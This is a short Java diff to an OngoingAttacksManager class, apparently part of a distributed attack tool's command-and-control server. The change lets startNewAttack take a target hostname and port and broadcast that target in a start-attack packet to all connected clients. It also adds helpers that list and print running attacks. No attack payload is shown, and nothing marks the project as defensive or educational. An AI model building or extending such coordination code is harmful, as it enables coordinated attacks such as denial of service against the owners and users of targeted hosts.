@@ -21,12 +21,16 @@ public class OngoingAttacksManager {
 		this.dictionary = VectorDictionary.getInstance();
 	}
 
-	public void startNewAttack(Class<? extends AttackVector> clazz) {
+	public HashMap<UUID, AttackVector> getOngoingAttacks() {
+		return ongoingAttacks;
+	}
+
+	public void startNewAttack(Class<? extends AttackVector> clazz, String hostname, int port) {
 		UUID attackId = UUID.randomUUID();
 		int id = dictionary.getIdFor(clazz);
 		AttackVector toSet = dictionary.newInstance(id);
 
-		StartAttackPacket packet = new StartAttackPacket(id, attackId);
+		StartAttackPacket packet = new StartAttackPacket(id, attackId, hostname, port);
 		// Broadcast attack start
 		manager.getActiveConnections().values().forEach(c -> c.sendPacket(packet));
 
@@ -43,6 +47,14 @@ public class OngoingAttacksManager {
 		manager.getActiveConnections().values().forEach(c -> c.sendPacket(stopping));
 		EventLog.getInstance().addLog("Stopped attack " + attackVector + " (" + attackId + ")");
 		this.ongoingAttacks.remove(attackId);
+	}
+
+	public void printRunningAttacks() {
+		System.out.println("----");
+		this.ongoingAttacks.forEach((c, v) -> {
+			System.out.println("ID: " + c + " Type: " + v.getClass().getSimpleName());
+		});
+		System.out.println("----");
 	}
 
 }
